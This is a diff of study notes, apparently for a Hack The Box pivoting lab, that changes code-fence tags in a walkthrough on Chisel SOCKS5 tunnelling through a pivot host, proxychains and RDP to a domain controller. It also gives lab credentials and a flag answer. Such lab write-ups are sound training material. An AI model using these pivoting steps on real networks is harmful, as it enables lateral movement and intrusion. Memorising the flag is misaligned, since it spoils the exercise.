@@ -4,7 +4,7 @@
 ## Setting Up & Using Chisel
 ### Installing Chisel
 
-```sh
+```shellsession
 $ go install github.com/jpillora/chisel@latest
 ```
 
@@ -13,7 +13,7 @@ $ go install github.com/jpillora/chisel@latest
 ### Shrinking binary size
 It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. 
 
-```sh
+```shellsession
 masterofblafu@htb[~/go/bin/chisel]$ du -hs chisel 
 10M     chisel
 masterofblafu@htb[~/go/bin/chisel]$ go build -ldflags="-s -w"
@@ -27,7 +27,7 @@ masterofblafu@htb[~/go/bin/chisel]$ du -hs chisel
 ### Transferring Chisel Binary to Pivot Host
 Once the binary is built, we can use `scp` to transfer it to the target pivot host.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
  
 ubuntu@10.129.202.64's password: 
@@ -37,7 +37,7 @@ chisel                                        100%   11MB   1.2MB/s   00:09
 ### Running the Chisel Server on the Pivot Host
 Then we can start the Chisel server/listener.
 
-```sh
+```shellsession
 ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
 
 2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
@@ -48,7 +48,7 @@ The Chisel listener will listen for incoming connections on port `1234` using SO
 
 ### Connecting to the Chisel Server
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
 
 2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
@@ -64,7 +64,7 @@ As you can see in the above output, the Chisel client has created a TCP/UDP tunn
 
 ### Editing & Confirming proxychains.conf
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ tail -f /etc/proxychains.conf 
 
 #
@@ -82,7 +82,7 @@ socks5 127.0.0.1 1080
 ### Pivoting to the DC
 Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 
@@ -93,7 +93,7 @@ When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R`
 
 ### Starting the Chisel Server on our Attack Host
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
 
 2022/05/30 10:19:16 server: Reverse tunnelling enabled
@@ -103,7 +103,7 @@ masterofblafu@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
 
 ### Connecting the Chisel Client to our Attack Host
 
-```sh
+```shellsession
 ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
 
 2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
@@ -115,7 +115,7 @@ ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
 
 ### Editing & Confirming proxychains.conf
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ tail -f /etc/proxychains.conf 
 
 [ProxyList]
@@ -126,7 +126,7 @@ socks5 127.0.0.1 1080
 
 If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 
@@ -134,20 +134,20 @@ masterofblafu@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@1
 SSH to **10.129.7.110** (ACADEMY-PIVOTING-LINUXPIV), with user `ubuntu` and password `HTB_@cademy_stdnt!`
 1. Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer. **Answer: Th3\$eTunne1\$@rent8oring!**
    - Install chisel on the attack host and start the Chisel Server:
-        ```sh
+        ```shellsession
         $ go install github.com/jpillora/chisel@v1.10.1
         $ cd ~/go/bin
         $ chisel server --reverse -v -p 1234 --socks5
         ```
    - Copy chisel to the target pivot host and connect the Chisel Client to our Attack Host:
-        ```sh
+        ```shellsession
         $ scp ~/go/bin/chisel ubuntu@10.129.7.110:/home/ubuntu
         # At pivot host
         $ chmod +x chisel
         $ ./chisel client -v 10.10.15.159 R:socks
         ```
    - Edit the `/etc/proxychains.conf` to specify the default socks port:
-        ```sh
+        ```shellsession
         # At attack host
         $ tail -4 /etc/proxychains.conf
         # meanwile
